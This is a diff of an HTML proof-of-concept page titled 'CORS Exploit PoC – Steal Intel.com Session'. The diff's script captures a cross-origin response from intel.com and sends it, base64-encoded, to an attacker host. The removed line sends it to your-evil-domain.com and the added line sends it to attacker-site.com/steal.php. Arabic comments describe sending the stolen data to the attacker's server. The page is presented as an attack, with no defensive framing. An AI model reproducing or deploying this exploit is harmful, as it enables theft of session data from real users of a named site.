@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit PoC</title>
+  <title>CORS Exploit PoC – Steal Intel.com Session</title>
 </head>
 <body>
   <h1>CORS Exploit PoC – Steal Intel.com Session</h1>
@@ -15,9 +15,11 @@
       })
       .then(response => response.text())
       .then(data => {
-        // إرسال البيانات لمهاجم
-        fetch("https://your-evil-domain.com/steal.php?data=" + btoa(data));
-        alert("Response from intel.com captured:\n" + data);
+        // طباعة البيانات في console (أو إرسالها لموقعك)
+        console.log("Intel.com response:", data);
+
+        // إرسالها لسيرفر المهاجم (اختياري لو حبيت)
+        fetch("https://attacker-site.com/steal.php?data=" + btoa(data));
       })
       .catch(error => {
         console.error("Exploit failed", error);
@@ -26,3 +28,4 @@
   </script>
 </body>
 </html>
+
